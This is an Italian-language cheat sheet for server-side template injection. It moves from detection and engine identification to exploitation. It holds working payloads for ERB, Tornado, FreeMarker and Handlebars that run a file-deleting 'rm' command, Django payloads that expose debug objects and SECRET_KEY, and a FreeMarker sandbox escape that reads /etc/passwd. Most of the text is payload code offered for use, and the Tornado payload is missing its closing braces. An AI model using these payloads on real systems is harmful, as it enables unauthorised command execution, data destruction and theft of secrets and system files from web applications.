# Caratteri di verifica:
```
${{<%[%'"}}%\
```

# Detection
* Usare i simboli base per vedere se qualcuno causa qualche effetto indisiderato (come rendere invisibile una parte di testo);
* Inserire fra l'apertura e la chiusura 7*7. Se viene stampato 49 allora è responsive e vulnerabile;

# Identification
* Causare uno stacktrace per leggere il nome del template engine usato (inserendo banalmente una variabile insistente, come: ${my_var});
* Trovare qualche informazione nel codice sorgente;
* Leggere la documentazione del template rilevato.

# Exploitation
(ricordati di codificare i payload in URL syntax)
## ERB
```
<%= system("rm /path/to/file.txt") %>
```

## Tornado
```
{% import os %}
{{os.system('rm /path/to/file.txt')
```

## FreeMarker
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /path/to/file.txt") }
```

## Handlebars
```
{{this}}
```
Vulnerabile se ritorna:
```
[Object object]
```


- Oppure

```
Ciao, funziona!{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /path/to/file.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Django
* Per mostrare tutti gli oggetti:
```
{% debug %}
```
* Per interagire con essi:
```
(Es. SECRET_KEY: valore segreto che potrebbe contenere chiavi autenticative)
{{settings.SECRET_KEY}}
```

## More
...

# Sandbox Escape
Relativamente al linguaggio usato, deve essere codificata una chain di metodi in grado di ottemperare la nostro scopo bypassando le protenzioni della standbox. 

## FreeMarker (Java)
* read file (output: hex):
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```




